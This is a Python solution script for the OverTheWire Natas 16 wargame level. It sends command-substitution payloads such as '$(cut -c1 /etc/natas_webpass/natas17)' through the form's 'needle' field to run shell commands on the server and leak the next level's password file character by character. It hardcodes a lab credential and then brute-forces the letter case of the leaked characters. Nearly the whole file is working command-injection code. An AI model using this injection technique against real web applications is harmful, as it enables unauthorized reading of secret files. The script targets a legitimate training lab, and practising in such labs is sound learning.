import requests
from requests.auth import HTTPBasicAuth

auth_username = 'natas16'
auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
word_list = []
password_list = [""]
numeral_list = ["0", "1", "2", "3" ,"4", "5", "6", "7", "8", "9"]
def brute_force_positions():
    for i in range(1, 33):

        payload = '$(cut -c' + str(i) +' /etc/natas_webpass/natas17)'
        response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
        response_text = response.text
        response_text_start_index = response_text.index("<pre>")
        response_text = response_text[response_text_start_index + 5:]
        response_text_end_index = response_text.index("</pre>")
        response_text = response_text[0:response_text_end_index]
        line_split = response_text.split("\n")
        captured_line = ""
        for line in line_split:
            if(len(line) == 1):
                captured_line = line
                word_list.append(line)
                print(line)

        if(captured_line == ""):
            word_list.append("numeral")
            print("numeral")

def modified_queries():
    payload = '$(cut -c2 /etc/natas_webpass/natas17)'
    response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
    print(response.text)

def create_password_list():
    global word_list
    global password_list
    global numeral_list
    index = 1
    for word in word_list:
        print(index)
        index = index + 1
        if(word == "numeral"):
            new_list = []
            for password in password_list:
                for numeral in numeral_list:
                    new_list.append(password + numeral)
        else:
            upper = word.upper()
            lower = word.lower()
            new_list = []
            for password in password_list:
                new_list.append(password + upper)
                new_list.append(password + lower)
        password_list = list(new_list)
        del(new_list)
    
    file_object = open("passwords_natas17.txt", "w")
    file_object.write(password_list)
    file_object.close()


brute_force_positions()
create_password_list()